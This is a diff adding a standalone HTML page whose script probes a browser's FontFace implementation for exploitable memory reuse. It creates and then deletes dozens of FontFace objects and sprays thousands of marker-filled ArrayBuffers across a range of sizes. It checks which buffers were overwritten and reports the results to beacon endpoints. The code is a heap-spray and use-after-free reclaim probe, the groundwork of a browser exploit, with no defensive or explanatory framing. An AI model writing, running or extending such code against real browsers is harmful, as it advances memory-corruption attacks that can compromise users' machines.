@@ -1,0 +1,98 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p692-sz</title></head>
+<body><pre id="out">p692-sz: FontFace size probe</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,d){
+  var msg='P692S-'+tag+(d!==undefined?'-'+String(d).slice(0,800):'');
+  say(msg);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST','/api/beacon',false);
+    x.setRequestHeader('Content-Type','application/json');
+    x.send(JSON.stringify({stage:'p692s',msg:msg,level:'info',sid:'sz-'+Date.now(),ua:navigator.userAgent}));
+  }catch(e){
+    try{new Image().src='/beacon?m='+encodeURIComponent(msg)+'&t='+Date.now();}catch(e2){}
+  }
+}
+
+var retained=[];
+
+function trySize(sz, cb){
+  bk('TRY','sz='+sz);
+
+  var faces=[];
+  for(var i=0;i<64;i++){
+    try{
+      var f=new FontFace('test'+i+'_'+sz,'local(Arial)',{});
+      document.fonts.add(f);
+      faces.push(f);
+    }catch(e){bk('CTOR-ERR',e.message);break;}
+  }
+
+  // Load them
+  var loaded=0;
+  var total=faces.length;
+  for(var i=0;i<faces.length;i++){
+    faces[i].load().then(function(){
+      loaded++;
+      if(loaded>=total) afterLoad();
+    }).catch(function(){
+      loaded++;
+      if(loaded>=total) afterLoad();
+    });
+  }
+
+  function afterLoad(){
+    // Delete them to free
+    for(var i=0;i<faces.length;i++){
+      try{document.fonts.delete(faces[i]);}catch(e){}
+    }
+    faces=null;
+
+    // Spray with this size
+    var MARKER=0xDEAD0000+sz;
+    var bufs=[];
+    for(var i=0;i<2048;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      // Write markers at multiple offsets
+      for(var off=0;off+4<=sz;off+=8){
+        dv.setUint32(off,MARKER+i,true);
+      }
+      bufs.push({ab:ab,dv:dv});
+    }
+    retained.push(bufs);
+
+    // Check which buffers got overwritten (reclaim)
+    var hits=0;
+    for(var i=0;i<bufs.length;i++){
+      var changed=false;
+      for(var off=0;off+4<=sz;off+=8){
+        var v=bufs[i].dv.getUint32(off,true);
+        if(v!==(MARKER+i)){changed=true;break;}
+      }
+      if(changed) hits++;
+    }
+    bk('RESULT','sz='+sz+'-hits='+hits+'-of-'+bufs.length);
+    cb(hits);
+  }
+}
+
+// Test sizes: 64, 96, 128, 160, 192, 224, 256, 320, 384, 512
+var sizes=[64,96,128,160,192,224,256,320,384,512];
+var idx=0;
+
+function next(){
+  if(idx>=sizes.length){bk('DONE');return;}
+  trySize(sizes[idx++],function(hits){
+    setTimeout(next,100);
+  });
+}
+
+bk('START');
+setTimeout(next,500);
+</script></body></html>
